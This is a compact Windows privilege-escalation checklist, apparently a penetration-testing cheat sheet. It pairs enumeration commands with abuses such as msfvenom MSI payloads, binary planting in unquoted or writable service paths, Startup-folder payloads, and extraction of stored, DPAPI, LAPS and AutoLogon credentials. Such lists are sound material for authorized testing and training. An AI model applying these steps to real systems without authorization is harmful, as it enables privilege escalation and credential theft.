☐ cmdkey /list                          -> Stored credentials? -> runas /savecred
☐ reg query AlwaysInstallElevated       -> Both HKCU and HKLM set to 0x1? -> msfvenom .msi
☐ wmic service (unquoted paths)         -> Unquoted paths with spaces? -> Place binary in gap
☐ Get-CimInstance + icacls              -> Writable service binary? -> Replace with custom binary
☐ Get-ScheduledTask                     -> Elevated task with writable script or binary?
☐ DLL Hijacking (%PATH% audit)          -> Missing DLL in writable directory?
☐ Startup directory permissions         -> Writable All Users Startup? -> Place payload
☐ LAPS (ms-Mcs-AdmPwd)                  -> Query AD for plaintext local admin password
☐ DPAPI (vaultcmd /list)                -> Decrypt master keys and stored credential blobs
☐ netstat -ano                          -> Internal services listening on 127.0.0.1?
☐ systeminfo                            -> Check OS build against known kernel CVEs
☐ Get-ChildItem -Include *.kdbx,*.xml   -> Web.config, Unattend.xml, KeePass database files?
☐ PowerShell History                    -> ConsoleHost_history.txt credential leakage?
☐ Event Logs (ID 4104)                  -> Cleartext passwords in Script Block Logging?
☐ reg query Winlogon                    -> DefaultPassword in registry AutoLogon?
☐ Run winPEAS & PowerUp                 -> Automated deep configuration audit
```
